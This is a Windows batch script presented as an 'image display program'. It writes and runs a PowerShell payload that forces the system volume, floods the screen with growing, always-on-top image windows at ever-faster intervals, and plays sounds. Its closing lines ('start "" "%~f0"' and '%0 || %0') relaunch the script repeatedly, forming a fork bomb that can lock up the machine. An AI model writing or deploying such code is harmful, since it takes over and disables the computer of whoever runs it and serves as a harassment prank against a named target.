@echo off
setlocal enabledelayedexpansion

:: === Setup paths ===
set "SCRIPT=%TEMP%\sam_ta_warning.ps1"
:: === Write PowerShell script ===
> "%SCRIPT%" echo $sh = New-Object -ComObject WScript.Shell
>> "%SCRIPT%" echo # Set system volume to approximately 30%
>> "%SCRIPT%" echo # First minimize volume, then set to 30%
>> "%SCRIPT%" echo for ($i = 0; $i -lt 50; $i++) { $sh.SendKeys([char]174); Start-Sleep -Milliseconds 10 }  # fail safe by minimizing volume to 0%
>> "%SCRIPT%" echo for ($i = 0; $i -lt 20; $i++) { $sh.SendKeys([char]175); Start-Sleep -Milliseconds 10 }  # Change volume here (each time is multipled by 2.5%)
>> "%SCRIPT%" echo Add-Type -AssemblyName System.Speech

>> "%SCRIPT%" echo # Function to play random sound after vine boom
>> "%SCRIPT%" echo function Play-RandomSound {
>> "%SCRIPT%" echo     try {
>> "%SCRIPT%" echo         # First play vine boom
>> "%SCRIPT%" echo         $vineBoomPath = '%~dp0vine-boom.mp3'
>> "%SCRIPT%" echo         if (Test-Path $vineBoomPath) {
>> "%SCRIPT%" echo             Add-Type -AssemblyName presentationCore
>> "%SCRIPT%" echo             $mediaPlayer1 = New-Object system.windows.media.mediaplayer
>> "%SCRIPT%" echo             $mediaPlayer1.volume = 0.3
>> "%SCRIPT%" echo             $mediaPlayer1.open($vineBoomPath)
>> "%SCRIPT%" echo             $mediaPlayer1.Play()
>> "%SCRIPT%" echo             Start-Sleep -Milliseconds 800  # Wait for vine boom to finish
>> "%SCRIPT%" echo             Write-Host "Playing vine boom sound"
>> "%SCRIPT%" echo         } else {
>> "%SCRIPT%" echo             Write-Host "Warning: vine-boom.mp3 not found at $vineBoomPath"
>> "%SCRIPT%" echo         }
>> "%SCRIPT%" echo         
>> "%SCRIPT%" echo         # Then play random sound (roblox.m4a or nostudy.m4a)
>> "%SCRIPT%" echo         $randomSounds = @('%~dp0roblox.m4a', '%~dp0nostudy.m4a')
>> "%SCRIPT%" echo         $rand = New-Object System.Random
>> "%SCRIPT%" echo         $selectedSound = $randomSounds[$rand.Next(0, $randomSounds.Count)]
>> "%SCRIPT%" echo         
>> "%SCRIPT%" echo         if (Test-Path $selectedSound) {
>> "%SCRIPT%" echo             Add-Type -AssemblyName presentationCore
>> "%SCRIPT%" echo             $mediaPlayer2 = New-Object system.windows.media.mediaplayer
>> "%SCRIPT%" echo             $mediaPlayer2.volume = 0.3
>> "%SCRIPT%" echo             $mediaPlayer2.open($selectedSound)
>> "%SCRIPT%" echo             $mediaPlayer2.Play()
>> "%SCRIPT%" echo             Start-Sleep -Milliseconds 300  # Brief wait
>> "%SCRIPT%" echo             Write-Host "Playing random sound: $(Split-Path $selectedSound -Leaf)"
>> "%SCRIPT%" echo         } else {
>> "%SCRIPT%" echo             Write-Host "Warning: sound not found at $selectedSound"
>> "%SCRIPT%" echo         }
>> "%SCRIPT%" echo     } catch {
>> "%SCRIPT%" echo         Write-Host "Error playing sound: $_"
>> "%SCRIPT%" echo     }
>> "%SCRIPT%" echo }

>> "%SCRIPT%" echo Add-Type -AssemblyName System.Windows.Forms
>> "%SCRIPT%" echo Add-Type -AssemblyName System.Drawing
>> "%SCRIPT%" echo # Create application context to keep forms alive
>> "%SCRIPT%" echo $applicationContext = New-Object System.Windows.Forms.ApplicationContext

>> "%SCRIPT%" echo $images = @('%~dp0sam.jpg','%~dp0hello.jpg', '%~dp0chula.jpg', '%~dp0dog.png', '%~dp0esan.jpg', '%~dp0ikr.png', '%~dp0love.jpg', '%~dp0mil.png', '%~dp0skin.png')
>> "%SCRIPT%" echo $forms = @()
>> "%SCRIPT%" echo $currentSize = 200  # Starting size
>> "%SCRIPT%" echo $maxSize = 800      # Maximum size limit
>> "%SCRIPT%" echo $sequenceIndex = 0  # Track sequence progress
>> "%SCRIPT%" echo $isSequenceMode = $true  # Flag for sequence vs random mode
>> "%SCRIPT%" echo $currentInterval = 500  # Starting interval (2 seconds)
>> "%SCRIPT%" echo $minInterval = 100      # Minimum interval (0.1 seconds)

>> "%SCRIPT%" echo # Function to create a new form
>> "%SCRIPT%" echo function Create-Form {
>> "%SCRIPT%" echo     param([int]$imageIndex = -1)
>> "%SCRIPT%" echo     
>> "%SCRIPT%" echo     $rand = New-Object System.Random
>> "%SCRIPT%" echo     $screenWidth = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds.Width
>> "%SCRIPT%" echo     $screenHeight = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds.Height
>> "%SCRIPT%" echo     
>> "%SCRIPT%" echo     # Calculate position to keep form on screen
>> "%SCRIPT%" echo     $maxX = [Math]::Max(0, $screenWidth - $script:currentSize)
>> "%SCRIPT%" echo     $maxY = [Math]::Max(0, $screenHeight - $script:currentSize)
>> "%SCRIPT%" echo     $x = $rand.Next(0, $maxX)
>> "%SCRIPT%" echo     $y = $rand.Next(0, $maxY)

>> "%SCRIPT%" echo     $form = New-Object Windows.Forms.Form
>> "%SCRIPT%" echo     $form.FormBorderStyle = 'None'
>> "%SCRIPT%" echo     $form.TopMost = $true
>> "%SCRIPT%" echo     $form.StartPosition = 'Manual'
>> "%SCRIPT%" echo     $form.Location = New-Object System.Drawing.Point($x, $y)
>> "%SCRIPT%" echo     $form.Size = New-Object System.Drawing.Size($script:currentSize, $script:currentSize)
>> "%SCRIPT%" echo     
>> "%SCRIPT%" echo     Write-Host "Creating form with size: $($script:currentSize)x$($script:currentSize)"

>> "%SCRIPT%" echo     # Determine which image to use
>> "%SCRIPT%" echo     if ($imageIndex -ge 0) {
>> "%SCRIPT%" echo         $imgPath = $images[$imageIndex]
>> "%SCRIPT%" echo     } else {
>> "%SCRIPT%" echo         $imgPath = $images[$rand.Next(0, $images.Count)]
>> "%SCRIPT%" echo     }
>> "%SCRIPT%" echo     
>> "%SCRIPT%" echo     if (Test-Path $imgPath) {
>> "%SCRIPT%" echo         $pic = New-Object Windows.Forms.PictureBox
>> "%SCRIPT%" echo         $pic.Image = [System.Drawing.Image]::FromFile($imgPath)
>> "%SCRIPT%" echo         $pic.SizeMode = 'StretchImage'
>> "%SCRIPT%" echo         $pic.Dock = 'Fill'
>> "%SCRIPT%" echo         $form.Controls.Add($pic)
>> "%SCRIPT%" echo     }

>> "%SCRIPT%" echo     $form.Show()
>> "%SCRIPT%" echo     
>> "%SCRIPT%" echo     # Play vine boom followed by random sound every time an image appears
>> "%SCRIPT%" echo     Play-RandomSound
>> "%SCRIPT%" echo     
>> "%SCRIPT%" echo     # Increase size for next form (add 100x100)
>> "%SCRIPT%" echo     if ($script:currentSize -lt $script:maxSize) {
>> "%SCRIPT%" echo         $script:currentSize += 100
>> "%SCRIPT%" echo     } else {
>> "%SCRIPT%" echo         Write-Host "Maximum size reached: $($script:maxSize)x$($script:maxSize)"
>> "%SCRIPT%" echo     }
>> "%SCRIPT%" echo     
>> "%SCRIPT%" echo     return $form
>> "%SCRIPT%" echo }

>> "%SCRIPT%" echo # Main timer to create new forms periodically
>> "%SCRIPT%" echo $mainTimer = New-Object Windows.Forms.Timer
>> "%SCRIPT%" echo $mainTimer.Interval = $currentInterval
>> "%SCRIPT%" echo $mainTimer.Add_Tick({
>> "%SCRIPT%" echo     if ($script:isSequenceMode) {
>> "%SCRIPT%" echo         # Sequential mode - show images 0, 1, 2 in order
>> "%SCRIPT%" echo         $newForm = Create-Form -imageIndex $script:sequenceIndex
>> "%SCRIPT%" echo         $script:forms += $newForm
>> "%SCRIPT%" echo         $script:sequenceIndex++
>> "%SCRIPT%" echo         
>> "%SCRIPT%" echo         # After showing all 3 images in sequence, switch to random mode
>> "%SCRIPT%" echo         if ($script:sequenceIndex -ge $images.Count) {
>> "%SCRIPT%" echo             $script:isSequenceMode = $false
>> "%SCRIPT%" echo             Write-Host "Switching to random mode with faster intervals"
>> "%SCRIPT%" echo         }
>> "%SCRIPT%" echo     } else {
>> "%SCRIPT%" echo         # Random mode - show random images and speed up
>> "%SCRIPT%" echo         $newForm = Create-Form  # No imageIndex = random selection
>> "%SCRIPT%" echo         $script:forms += $newForm
>> "%SCRIPT%" echo         
>> "%SCRIPT%" echo         # Make intervals faster (reduce by 10% each time, minimum 100ms)
>> "%SCRIPT%" echo         $script:currentInterval = [Math]::Max($script:minInterval, $script:currentInterval * 0.9)
>> "%SCRIPT%" echo         $this.Interval = $script:currentInterval
>> "%SCRIPT%" echo         Write-Host "New interval: $($script:currentInterval)ms"
>> "%SCRIPT%" echo     }
>> "%SCRIPT%" echo })
>> "%SCRIPT%" echo $mainTimer.Start()

>> "%SCRIPT%" echo # Create initial form (first in sequence)
>> "%SCRIPT%" echo $forms += Create-Form -imageIndex 0
>> "%SCRIPT%" echo $sequenceIndex = 1  # Next will be image 1

>> "%SCRIPT%" echo # Keep application running
>> "%SCRIPT%" echo Write-Host "Press Ctrl+C to stop the program"
>> "%SCRIPT%" echo Write-Host "Starting with sequential display (0, 1, 2), then random with increasing speed"
>> "%SCRIPT%" echo Write-Host "Each image will play vine boom sound followed by a random sound (roblox.m4a or nostudy.m4a)"
>> "%SCRIPT%" echo try {
>> "%SCRIPT%" echo     [System.Windows.Forms.Application]::Run()
>> "%SCRIPT%" echo } finally {
>> "%SCRIPT%" echo     # Clean up forms when stopping
>> "%SCRIPT%" echo     foreach ($form in $forms) {
>> "%SCRIPT%" echo         if ($form -and !$form.IsDisposed) {
>> "%SCRIPT%" echo             $form.Close()
>> "%SCRIPT%" echo         }
>> "%SCRIPT%" echo     }
>> "%SCRIPT%" echo }

:: === Run PowerShell script ===
echo Starting the image display program...
echo Press Ctrl+C in the PowerShell window to stop
start "" "%~f0"
powershell -ExecutionPolicy Bypass -File "%SCRIPT%"


echo.
echo Program stopped. Press any key to exit.
%0 || %0
pause > nul
